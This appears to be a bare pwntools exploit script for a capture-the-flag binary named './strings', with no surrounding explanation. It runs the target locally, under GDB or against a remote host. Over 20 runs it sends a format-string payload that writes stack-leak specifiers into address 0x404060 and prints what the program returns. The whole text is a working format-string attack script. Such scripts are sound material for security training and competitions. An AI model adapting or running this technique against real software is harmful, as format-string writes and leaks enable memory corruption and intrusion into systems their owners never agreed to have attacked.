##CyberSpace##
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './strings'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])

for i in range(20):
    sleep(1)
    io = start()

    payload = fmtstr_payload(6, {0x404060 : '%{}$p'.format(i).encode()})
    io.sendlineafter(b'strings? \n', payload)
    print(io.recvall())
    io.close()
